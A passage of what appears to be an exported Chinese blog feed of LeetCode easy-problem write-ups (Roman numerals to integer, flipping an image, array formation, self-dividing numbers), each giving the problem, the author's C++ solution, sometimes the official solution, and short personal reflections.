class="keyword">return</span> x == <span class="number">0</span> &amp;&amp; y == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度： $O(N)$，其中 $N$ 表示 $\textit{moves}$ 指令串的长度。我们只需要遍历一遍字符串即可。</p>
</li>
<li><p>空间复杂度： $O(1)$。我们只需要常数的空间来存放若干变量。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的思路一样，不过有值得学习的地方。第一点可以改用增强for循环，第二点return返回时使用逻辑表达式，不像我用了if判断😆，题目还比较简单。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>罗马数字转整数</title>
    <url>/2020/10/29/%E7%BD%97%E9%A9%AC%E6%95%B0%E5%AD%97%E8%BD%AC%E6%95%B4%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/roman-to-integer/"><strong>题目地址</strong></a></p>
<p><strong>题目名称：</strong>罗马数字转整数</p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>罗马数字包含以下七种字符：<code>I</code>，<code>V</code>，<code>X</code>，<code>L</code>，<code>C</code>，<code>D</code>和<code>M</code>。</p>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符          数值</span><br><span class="line">I             1</span><br><span class="line">V             5</span><br><span class="line">X             10</span><br><span class="line">L             50</span><br><span class="line">C             100</span><br><span class="line">D             500</span><br><span class="line">M             1000</span><br></pre></td></tr></table></figure>
<p>例如， 罗马数字 2 写做 <code>II</code> ，即为两个并列的 1。12 写做 <code>XII</code> ，即为 <code>X</code> + <code>II</code> 。 27 写做  <code>XXVII</code>, 即为 <code>XX</code> + <code>V</code> + <code>II</code> 。</p>
<p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 <code>IIII</code>，而是 <code>IV</code>。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 <code>IX</code>。这个特殊的规则只适用于以下六种情况：</p>
<ul>
<li><code>I</code> 可以放在 <code>V</code> (5) 和 <code>X</code> (10) 的左边，来表示 4 和 9。</li>
<li><code>X</code> 可以放在 <code>L</code> (50) 和 <code>C</code> (100) 的左边，来表示 40 和 90。 </li>
<li><code>C</code> 可以放在 <code>D</code> (500) 和 <code>M</code> (1000) 的左边，来表示 400 和 900。</li>
</ul>
<p>给定一个罗马数字，将其转换成整数。输入确保在 1 到 3999 的范围内。</p>
<p><strong>示例1：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">&quot;III&quot;</span></span><br><span class="line">输出: <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">&quot;IV&quot;</span></span><br><span class="line">输出: <span class="number">4</span></span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">&quot;IX&quot;</span></span><br><span class="line">输出: <span class="number">9</span></span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">&quot;LVIII&quot;</span></span><br><span class="line">输出: <span class="number">58</span></span><br><span class="line">解释: L = <span class="number">50</span>, V= <span class="number">5</span>, III = <span class="number">3.</span></span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">&quot;MCMXCIV&quot;</span></span><br><span class="line">输出: <span class="number">1994</span></span><br><span class="line">解释: M = <span class="number">1000</span>, CM = <span class="number">900</span>, XC = <span class="number">90</span>, IV = <span class="number">4.</span></span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>题目所给测试用例皆符合罗马数字书写规则，不会出现跨位等情况。</li>
<li>IC 和 IM 这样的例子并不符合题目要求，49 应该写作 XLIX，999 应该写作 CMXCIX 。</li>
<li>关于罗马数字的详尽书写规则，可以参考 <a href="https://b2b.partcommunity.com/community/knowledge/zh_CN/detail/10753/%E7%BD%97%E9%A9%AC%E6%95%B0%E5%AD%97#knowledge_article">罗马数字 - Mathematics</a> 。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历字符串，把每个字符代表的数字加起来，因为本来就是加法操作，所以右加情况不用特殊处理，只需特殊处理左减情况，也就是当前字符是<code>I</code>、<code>X</code>、<code>C</code>时特殊处理。</p>
<p><strong>C++代码：</strong></p>
<p>下面是自己提交通过的代码（执行用时12ms，击败82.74%，内存消耗6.3M，击败62.60%）：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">romanToInt</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//存储转换后的整数</span></span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//遍历s，只需特殊处理左减情况</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;M&#x27;</span>)&#123;</span><br><span class="line">                result+=<span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">&#x27;D&#x27;</span>)&#123;</span><br><span class="line">                result+=<span class="number">500</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">&#x27;C&#x27;</span>)&#123;</span><br><span class="line">                <span class="comment">//不是最后一位</span></span><br><span class="line">                <span class="keyword">if</span>(i!=s.length()<span class="number">-1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(s[i+<span class="number">1</span>]==<span class="string">&#x27;D&#x27;</span>)&#123;</span><br><span class="line">                        <span class="comment">//CD表示400</span></span><br><span class="line">                        result+=<span class="number">400</span>;</span><br><span class="line">                        i++;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i+<span class="number">1</span>]==<span class="string">&#x27;M&#x27;</span>)&#123;</span><br><span class="line">                        <span class="comment">//CM表示900</span></span><br><span class="line">                        result+=<span class="number">900</span>;</span><br><span class="line">                        i++;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//C是最后一位或者下一位不是D或M</span></span><br><span class="line">                result+=<span class="number">100</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">&#x27;L&#x27;</span>)&#123;</span><br><span class="line">                result+=<span class="number">50</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">&#x27;X&#x27;</span>)&#123;</span><br><span class="line">                <span class="comment">//不是最后一位</span></span><br><span class="line">                <span class="keyword">if</span>(i!=s.length()<span class="number">-1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(s[i+<span class="number">1</span>]==<span class="string">&#x27;L&#x27;</span>)&#123;</span><br><span class="line">                        <span class="comment">//XL表示40</span></span><br><span class="line">                        result+=<span class="number">40</span>;</span><br><span class="line">                        i++;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i+<span class="number">1</span>]==<span class="string">&#x27;C&#x27;</span>)&#123;</span><br><span class="line">                        <span class="comment">//LC表示90</span></span><br><span class="line">                        result+=<span class="number">90</span>;</span><br><span class="line">                        i++;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//X是最后一位或者下一位不是L或C</span></span><br><span class="line">                result+=<span class="number">10</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">&#x27;V&#x27;</span>)&#123;</span><br><span class="line">                result+=<span class="number">5</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">&#x27;I&#x27;</span>)&#123;</span><br><span class="line">                <span class="comment">//不是最后一位</span></span><br><span class="line">                <span class="keyword">if</span>(i!=s.length()<span class="number">-1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(s[i+<span class="number">1</span>]==<span class="string">&#x27;V&#x27;</span>)&#123;</span><br><span class="line">                        <span class="comment">//IV表示4</span></span><br><span class="line">                        result+=<span class="number">4</span>;</span><br><span class="line">                        i++;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i+<span class="number">1</span>]==<span class="string">&#x27;X&#x27;</span>)&#123;</span><br><span class="line">                        <span class="comment">//IX表示9</span></span><br><span class="line">                        result+=<span class="number">9</span>;</span><br><span class="line">                        i++;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//I是最后一位或者下一位不是V或X</span></span><br><span class="line">                result+=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<p>好像没有官方题解没找到，不过自己提交的效率也还可以。</p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>这道题是中午吃饭前看的，吃饭的时候想了一些，还挺好的，以后可以在脑海里存道题目，吃饭洗澡等空闲时可以多想一想，另外简单题越来越熟练了，继续加油吧🧐。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>翻转图像</title>
    <url>/2020/11/13/%E7%BF%BB%E8%BD%AC%E5%9B%BE%E5%83%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/flipping-an-image/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个二进制矩阵 <code>A</code>，我们想先水平翻转图像，然后反转图像并返回结果。</p>
<p>水平翻转图片就是将图片的每一行都进行翻转，即逆序。例如，水平翻转 <code>[1, 1, 0]</code> 的结果是 <code>[0, 1, 1]</code>。</p>
<p>反转图片的意思是图片中的 <code>0</code> 全部被 <code>1</code> 替换， <code>1</code> 全部被 <code>0</code> 替换。例如，反转 <code>[0, 1, 1]</code> 的结果是 <code>[1, 0, 0]</code>。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [[1,1,0],[1,0,1],[0,0,0]]</span><br><span class="line">输出: [[1,0,0],[0,1,0],[1,1,1]]</span><br><span class="line">解释: 首先翻转每一行: [[0,1,1],[1,0,1],[0,0,0]]；</span><br><span class="line">     然后反转图片: [[1,0,0],[0,1,0],[1,1,1]]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [[1,1,0,0],[1,0,0,1],[0,1,1,1],[1,0,1,0]]</span><br><span class="line">输出: [[1,1,0,0],[0,1,1,0],[0,0,0,1],[1,0,1,0]]</span><br><span class="line">解释: 首先翻转每一行: [[0,0,1,1],[1,0,0,1],[1,1,1,0],[0,1,0,1]]；</span><br><span class="line">     然后反转图片: [[1,1,0,0],[0,1,1,0],[0,0,0,1],[1,0,1,0]]</span><br></pre></td></tr></table></figure>
<p><strong>说明:</strong></p>
<ul>
<li><code>1 &lt;= A.length = A[0].length &lt;= 20</code></li>
<li><code>0 &lt;= A[i][j] &lt;= 1</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历每一行，然后对每一行中的元素翻转交换元素的值（swap函数），再反转元素的值，注意特殊情况，矩阵行数为奇数时中间元素要特殊处理反转一次。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败97.33%，内存消耗8.7M，击败28.26%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">flipAndInvertImage</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//遍历矩阵</span></span><br><span class="line">        <span class="keyword">int</span> n=A.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;(n+<span class="number">1</span>)/<span class="number">2</span>;++j)&#123;</span><br><span class="line">                <span class="comment">//翻转，交换两个元素的值</span></span><br><span class="line">                swap(A[i][j],A[i][n-j<span class="number">-1</span>]);</span><br><span class="line">                <span class="comment">//反转，与1异或</span></span><br><span class="line">                A[i][j]^=<span class="number">1</span>;</span><br><span class="line">                <span class="comment">//n是奇数时，中间的元素只能反转一次。</span></span><br><span class="line">                <span class="keyword">if</span>(j!=(n-j<span class="number">-1</span>))&#123;</span><br><span class="line">                    A[i][n-j<span class="number">-1</span>]^=<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/flipping-an-image/solution/fan-zhuan-tu-xiang-by-leetcode/">官方题解</a>:</h6><p><strong>方法一： 模拟</strong></p>
<p>我们可以不使用额外的（非常数）空间来完成翻转和反转操作。对于 <code>A[i][j]​</code>，我们将它和 <code>A[i][c - j - 1]​</code> 进行交换（即翻转），其中 <code>c</code> 是数组 <code>A</code> 的列数。在交换的同时，我们可以将这两个数进行反转。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] flipAndInvertImage(<span class="keyword">int</span>[][] A) &#123;</span><br><span class="line">        <span class="keyword">int</span> C = A[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] row: A)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (C + <span class="number">1</span>) / <span class="number">2</span>; ++i) &#123;</span><br><span class="line">                <span class="keyword">int</span> tmp = row[i] ^ <span class="number">1</span>;</span><br><span class="line">                row[i] = row[C - <span class="number">1</span> - i] ^ <span class="number">1</span>;</span><br><span class="line">                row[C - <span class="number">1</span> - i] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(M*N)$，其中 $M$ 和 $N$ 分别为数组 <code>A</code> 的行数和列数。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的思路一样，不过对于特殊情况比我处理的好，也不算特殊情况吧，只是我自己把它当作特殊情况处理了，主要在于我使用了vector容器中的swap成员函数来交换两个元素，这样必须反转后覆盖原值，对于奇数行数矩阵的每行中间元素反转了两次，而采用tmp辅助变量来进行交换两个元素值不涉及到覆盖问题。其实就是太执着于STL模板库中的成员函数了，自己实现交换元素的功能也挺好，相当于对源码根据实际情况进行了改进，这样才能更灵活地处理问题。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>能否连接形成数组</title>
    <url>/2020/11/10/%E8%83%BD%E5%90%A6%E8%BF%9E%E6%8E%A5%E5%BD%A2%E6%88%90%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/check-array-formation-through-concatenation/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数数组 <code>arr</code> ，数组中的每个整数 互不相同 。另有一个由整数数组构成的数组 <code>pieces</code>，其中的整数也 互不相同 。请你以 任意顺序 连接 <code>pieces</code> 中的数组以形成 <code>arr</code> 。但是，不允许 对每个数组 <code>pieces[i]</code> 中的整数重新排序。</p>
<p>如果可以连接 <code>pieces</code> 中的数组形成 <code>arr</code> ，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [85], pieces &#x3D; [[85]]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [15,88], pieces &#x3D; [[88],[15]]</span><br><span class="line">输出：true</span><br><span class="line">解释：依次连接 [15] 和 [88]</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [49,18,16], pieces &#x3D; [[16,18,49]]</span><br><span class="line">输出：false</span><br><span class="line">解释：即便数字相符，也不能重新排列 pieces[0]</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [91,4,64,78], pieces &#x3D; [[78],[4,64],[91]]</span><br><span class="line">输出：true</span><br><span class="line">解释：依次连接 [91]、[4,64] 和 [78]</span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,3,5,7], pieces &#x3D; [[2,4,6,8]]</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= pieces.length &lt;= arr.length &lt;= 100</code></li>
<li><code>sum(pieces[i].length) == arr.length</code></li>
<li><code>1 &lt;= pieces[i].length &lt;= arr.length</code></li>
<li><code>1 &lt;= arr[i], pieces[i][j] &lt;= 100</code></li>
<li><code>arr</code> 中的整数 互不相同</li>
<li><code>pieces</code> 中的整数 互不相同（也就是说，如果将 <code>pieces</code> 扁平化成一维数组，数组中的所有整数互不相同）</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>因为这个提示<code>sum(pieces[i].length) == arr.length</code>，说明pieces扁平化一维数组后的元素的值都应该在数组arr中</p>
<p>遍历数组pieces，判断元素中的第一个整数是否在数组arr中，确定其位置，然后对元素数组再次遍历，判断数组中的所有值是否都在arr中连续存在。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败44.15%，内存消耗10.3M，击败53.54%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canFormArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; pieces)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//遍历pieces</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;pieces.size();++i)&#123;</span><br><span class="line">            <span class="comment">//查找数组pieces[i]的第一个元素是否存在arr中，返回指向元素的指针</span></span><br><span class="line">            <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator it=find(arr.begin(),arr.end(),pieces[i][<span class="number">0</span>]);</span><br><span class="line">            <span class="comment">//没找到</span></span><br><span class="line">            <span class="keyword">if</span>(it==arr.end())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//找到了则从找到的位置开始判断当前pieces[i]的所有元素是否都在arr中连续存在</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;pieces[i].size();++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(*it!=pieces[i][j])&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ++it;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，之前我好想在周赛中遇到过这道题，当时没做出来🤣，我这个效率也还行，奥利给。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>自除数</title>
    <url>/2020/11/13/%E8%87%AA%E9%99%A4%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/self-dividing-numbers/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>自除数 是指可以被它包含的每一位数除尽的数。</p>
<p>例如，128 是一个自除数，因为 <code>128 % 1 == 0</code>，<code>128 % 2 == 0</code>，<code>128 % 8 == 0</code>。</p>
<p>还有，自除数不允许包含 0 。</p>
<p>给定上边界和下边界数字，输出一个列表，列表的元素是边界（含边界）内所有的自除数。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： </span><br><span class="line">上边界left &#x3D; 1, 下边界right &#x3D; 22</span><br><span class="line">输出： [1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 15, 22]</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ul>
<li>每个输入参数的边界满足 <code>1 &lt;= left &lt;= right &lt;= 10000</code>。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>直接遍历给定范围内的数，依次判断是否为自除数。不为自除数的情况有两种，一种是某位数为0，一种是不能被某个位数除尽，直接模拟。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100%，内存消耗6.9M，击败8.06%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">selfDividingNumbers</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=left;i&lt;=right;++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> tmp=i;</span><br><span class="line">            <span class="keyword">while</span>(tmp)&#123;</span><br><span class="line">                <span class="comment">//某位数为0或者不能被该位数除尽，不是自除数</span></span><br><span class="line">                <span class="keyword">if</span>(tmp%<span class="number">10</span>==<span class="number">0</span> || i%(tmp%<span class="number">10</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(tmp/<span class="number">10</span>==<span 